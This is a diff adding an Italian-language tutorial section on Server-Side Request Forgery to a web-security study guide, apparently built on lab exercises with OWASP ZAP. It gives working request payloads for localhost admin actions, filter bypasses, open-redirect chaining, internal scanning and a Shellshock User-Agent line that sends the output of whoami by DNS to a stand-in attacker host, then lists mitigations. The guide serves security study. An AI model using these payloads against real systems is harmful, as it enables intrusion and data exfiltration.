@@ -60,6 +60,12 @@ L'obiettivo è dimostrare un approccio "tool-agnostic" allo sfruttamento delle v
         *   [8.4 Offuscamento con Null Byte](#84-offuscamento-con-null-byte)
         *   [8.5 Polyglot Files (Flawed Content Validation)](#85-polyglot-files-flawed-content-validation)
         *   [8.6 Race Conditions](#86-race-conditions)
+    *   [9. Server-Side Request Forgery (SSRF)](#9-server-side-request-forgery-ssrf)
+        *   [9.1 SSRF contro il Server Locale (Localhost)](#91-ssrf-contro-il-server-locale-localhost)
+        *   [9.2 SSRF contro Sistemi Back-end (Internal Network Scanning)](#92-ssrf-contro-sistemi-back-end-internal-network-scanning)
+        *   [9.3 Evasione delle Difese SSRF (Bypass Techniques)](#93-evasione-delle-difese-ssrf-bypass-techniques)
+        *   [9.4 Blind SSRF Vulnerabilities e Interazioni Out-Of-Band (OAST)](#94-blind-ssrf-vulnerabilities-e-interazioni-out-of-band-oast)
+        *   [9.5 Prevenzione e Mitigazione](#95-prevenzione-e-mitigazione)
 *   [Parte 2: Client-Side Vulnerabilities](#parte-2-client-side-vulnerabilities)
 *   [Parte 3: Advanced Topics](#parte-3-advanced-topics)
 *   [Appendice: OWASP ZAP Automation Scripts](#appendice-owasp-zap-automation-scripts)
@@ -572,7 +578,83 @@ Alcuni sistemi caricano il file sul disco e lo scansionano *successivamente*, ca
 
 ---
 
-*(Le sezioni da 9 a 14 sono in fase di stesura...)*
+### 9. Server-Side Request Forgery (SSRF)
+
+La Server-Side Request Forgery (SSRF) è una vulnerabilità critica che consente a un attaccante di indurre un'applicazione server-side a effettuare richieste HTTP verso domini o indirizzi IP arbitrari. 
+
+Sfruttando la posizione privilegiata del server vulnerabile, un attaccante può aggirare i firewall di rete, accedere a interfacce amministrative interne (esposte solo su localhost), scansionare la rete intranet aziendale o esfiltrare dati sensibili verso server esterni.
+
+#### 9.1 SSRF contro il Server Locale (Localhost)
+Spesso le interfacce di amministrazione sono prive di rigidi controlli di accesso (es. login) se la richiesta proviene direttamente dalla macchina locale (`127.0.0.1` o `localhost`), in quanto si presume un livello di fiducia implicito (Trust Relationship).
+*   **Exploitation:** Se un parametro dell'applicazione accetta un URL per recuperare dati (es. un controllo scorte via API: `stockApi=http://...`), è possibile manipolarlo per puntare alle funzionalità di loopback.
+*   **Metodologia con ZAP (Break & Encoding):** Intercettando la richiesta, si modifica il parametro per puntare a `http://localhost/admin`. Per eseguire azioni distruttive (es. eliminare un utente), è fondamentale applicare l'**URL Encoding** ai caratteri speciali (`?` -> `%3F`, `=` -> `%3D`, `/` -> `%2F`) in modo che l'applicazione frontend non tronchi o interpreti male la stringa prima di inoltrarla al backend:
+```http
+stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+```
+
+#### 9.2 SSRF contro Sistemi Back-end (Internal Network Scanning)
+I server applicativi possono spesso comunicare con sistemi di back-end isolati e protetti da indirizzi IP privati non instradabili (es. `192.168.0.X`). Queste interfacce interne hanno frequentemente configurazioni di sicurezza deboli.
+*   **Internal Scanning con ZAP Fuzzer:** Selezionando l'ottetto finale dell'indirizzo IP locale come payload (es. `http://192.168.0.§1§:8080/admin`), si lancia lo ZAP Fuzzer con un range numerico da `1` a `255`.
+*   Ordinando i risultati per Codice di Stato (es. isolando gli `HTTP 200 OK` rispetto ai `404` o `500`), è possibile scoprire host vivi sulla rete interna (es. `192.168.0.120`) e inoltrare l'attacco mirato verso quell'IP.
+
+#### 9.3 Evasione delle Difese SSRF (Bypass Techniques)
+Molti sviluppatori implementano filtri per mitigare le SSRF. Tuttavia, a causa delle incongruenze nei parser URL, esistono numerose tecniche di evasione.
+
+**1. Bypass di Filtri Blacklist**  
+Se il server blocca le stringhe `127.0.0.1` o `localhost`, è possibile sfruttare rappresentazioni alternative e variazioni di maiuscole/minuscole.
+*   Indirizzi IP equivalenti: `127.1`, `2130706433` (Notazione Decimale), `017700000001` (Ottale).
+*   Obfuscazione case-sensitive e URL Encoding: Il filtro potrebbe bloccare `/admin`, ma lasciar passare `/aDmin`.
+```http
+stockApi=http%3A%2F%2F127%2E1%2FaDmin%2Fdelete%3Fusername%3Dcarlos
+```
+
+**2. Bypass di Filtri Whitelist**  
+Alcuni sistemi accettano solo URL che iniziano o contengono un dominio autorizzato (es. `stock.weliketoshop.net`). Si possono sfruttare le peculiarità delle specifiche URL:
+*   **Credenziali embedded:** `http://fake-user@expected-host.com`
+*   **Frammenti URL (#):** Inviando un doppio URL-encoding del carattere `#` (`%2523`), il parser del WAF lo considererà parte del nome utente, mentre la libreria HTTP di backend interpreterà il resto come un frammento, ignorandolo e connettendosi al server malevolo/locale.
+```http
+# Bypass del dominio autorizzato per connettersi a localhost
+http://localhost:80%2523@stock.weliketoshop.net/admin
+```
+
+**3. Filter Bypass via Open Redirection**  
+Se l'endpoint per la SSRF è blindato, ma l'applicazione contiene una vulnerabilità di *Open Redirection* su un altro endpoint autorizzato, le due vulnerabilità possono essere incatenate.
+*   Se `/product/nextProduct?path=X` reindirizza a `X`, si passa questo percorso valido al parametro SSRF. Il backend verificherà che l'URL iniziale è lecito, eseguirà la richiesta, seguirà il redirect HTTP in automatico e colpirà il target interno (es. `192.168.0.12`).
+```http
+stockApi=/product/nextProduct?path=[http://192.168.0.12:8080/admin](http://192.168.0.12:8080/admin)
+```
+
+#### 9.4 Blind SSRF Vulnerabilities e Interazioni Out-Of-Band (OAST)
+Nelle vulnerabilità SSRF di tipo *Blind*, l'applicazione esegue la richiesta in back-end, ma la risposta non viene mai mostrata all'attaccante nel front-end HTTP.
+
+Per confermare e sfruttare queste vulnerabilità, l'unica via è l'uso di tecniche **OAST (Out-Of-Band Application Security Testing)**, forzando il server a effettuare una risoluzione DNS o una connessione HTTP verso un server controllato dall'attaccante (utilizzando servizi agnostici come l'*OAST Add-on* di ZAP o *Interactsh*).
+
+**1. Superficie di attacco invisibile (Header Referer)**  
+Software di analitycs o log management spesso tentano di visitare o risolvere gli URL forniti nell'header `Referer` delle richieste in ingresso per tracciare il traffico.
+```http
+GET /product?id=1 HTTP/1.1
+Referer: [http://tuo-server-oast.com](http://tuo-server-oast.com)
+```
+Se il server di analytics è vulnerabile, l'attaccante riceverà un ping (DNS o HTTP) sul proprio listener OAST, confermando la Blind SSRF.
+
+**2. Exploitation Avanzata: Blind SSRF chaining con Shellshock**  
+Se si scopre una Blind SSRF, non potendo leggere le risposte interne, l'attaccante può sfruttarla per eseguire "alla cieca" exploit contro la rete interna.
+*   Ad esempio, un attaccante può usare il Fuzzer di ZAP per iterare la rete interna (es. `http://192.168.0.§1§:8080`) nell'header `Referer`, inserendo contemporaneamente un payload **Shellshock** nell'header `User-Agent` per forzare la Remote Code Execution sui server legacy interni.
+```http
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).tuo-server-oast.com
+Referer: [http://192.168.0.1:8080](http://192.168.0.1:8080)
+```
+*   Se uno dei server interni contattati tramite la SSRF è vulnerabile a Shellshock, eseguirà il comando e l'attaccante vedrà comparire il nome dell'utente del sistema operativo (es. `peter.tuo-server-oast.com`) nei log DNS del proprio server OAST, realizzando una RCE ed esfiltrazione di dati completamente Blind.
+
+#### 9.5 Prevenzione e Mitigazione
+Per prevenire gli attacchi SSRF, è raccomandato un approccio a più livelli (Defense-in-Depth):
+*   Non fidarsi dell'input dell'utente per costruire URL interni.
+*   Implementare rigide **Whitelist** di domini approvati, parsando le URL in modo canonico con librerie standard, stando attenti a frammenti e credenziali embedded.
+*   A livello di rete (Network Layer), configurare regole di firewall per bloccare il traffico in uscita dall'applicazione verso interfacce di loopback (127.0.0.0/8) o reti private interne, consentendolo solo verso host strettamente necessari.
+
+---
+
+*(Le sezioni da 10 a 14 sono in fase di stesura...)*
 
 ---
 
